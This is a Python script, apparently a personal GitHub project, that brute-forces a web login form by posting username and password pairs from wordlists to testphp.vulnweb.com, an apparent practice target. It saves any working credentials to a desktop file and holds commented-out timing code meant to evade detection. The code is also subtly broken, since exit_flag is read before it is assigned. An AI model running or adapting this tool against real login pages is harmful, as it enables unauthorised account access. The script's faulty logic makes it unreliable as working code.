"""
Name: web login bruteforce tool
Github: https://github.com/Namx45
"""

from random import randint as randnum
from time import sleep
import requests, os



# website target post request parameters
def web_parm():
    global headers
    url = "http://testphp.vulnweb.com/userinfo.php"
    payload = {"uname": "", "pass": ""}
    headers = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'en-US,en;q=0.9',
    'Cache-Control':'max-age=0',
    'Connection':'keep-alive',
    'Content-Length':'17',
    'Content-Type':'application/x-www-form-urlencoded',
    'Host':'testphp.vulnweb.com',
    "Origin":"http://testphp.vulnweb.com",
    "Referer":"http://testphp.vulnweb.com/login.php",
    'Upgrade-Insecure-Requests':'1',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0'
    }
    login_fail_msg = "If you are already registered please enter your login information below:"

    return url, headers, payload, login_fail_msg





# Returns Wordlists + Desktop file paths
def path_parm():
    desktop = "D:\\OneDrive\\\שולחן העבודה\\"
    user_list = "D:\\OneDrive\\\שולחן העבודה\\userlist.txt"
    pass_list = "D:\\OneDrive\\\שולחן העבודה\\passlist.txt"


    """
    read() --> returns the file content
    splitlines(False) --> splits a string 
    to a list. False to not keep \n """
    with open(user_list, "r") as userListFile:
        user_list = userListFile.read().splitlines()
    # same as user_list using for loop one liner
    with open(pass_list, "r") as PassListFile:
        pass_list = [line.strip() for line in PassListFile.readlines()]

    return desktop, user_list, pass_list





"""
in the future add to brute(**kargs) to allow unknown variables
to allow 0/1/2 variables (intensity, Force, multiple)

intensity => how much to allow dodging
Force => continue with bruteforce even if found credentials
multiple => allow multiple wordlist files (both user / pass)
"""

#def brute(intensity):
def brute():
    desktop, userLst, passLst = path_parm()
    """web_parm()[3:5] means take only the last
    value of values returning from web_parm()."""
    failMsg = web_parm()[3:5] # tuple 
    url, headers, payload = web_parm()[0:3] # tuple wrapped variables
    for user in userLst:
        if(exit_flag): break
        payload[list(payload)[0]] = user
        for passs in passLst:
            if(exit_flag): break
            payload[list(payload)[1]] = passs
            request = requests.post(url, headers=headers, data=payload)
            r_code = request.text
            if (failMsg[0] not in r_code):
                with open(desktop + "login_succsesful_page.html", "w") as file:
                    file.write(request.text)
                with open(desktop + "secret.text", "w") as file:
                    file.write(user + "\n" + passs)
                exit_flag = True
            else:
                print("Failed attempt for user: {u} + pass: {p}".format(u=user, p=passs))
                # change seconds between each
                # attempt to avoid detection :D
                #if (randnum(0, 1) == intensity):
                #    sleep(randnum(20, 45))
                #else:
                #    sleep(randnum(5, 17))





""" anonymous functions
this creates a function but inside a parameter the
function changes the cmd color using the color command """
#err = lambda : print("Evasion level can only\nbe a number between 1-3")
#lvl = input("Enter evasion level:\n1/2/3")
#while True:
#    if (not lvl.isnumeric()):
#        err()
#    elif (not (int(lvl) < 4 and int(lvl) > 0)):
#        err()
#    else:
#        lvl = int(lvl)
#        break
#brute(lvl)








color = lambda color_code : os.system(f"color {color_code}")        
color("4") # red (default)

brute()
color("2") # green (succesful login)
print("""Found a matching user + pass
it was saved as secret.txt in Desktop

Quitting...
""")




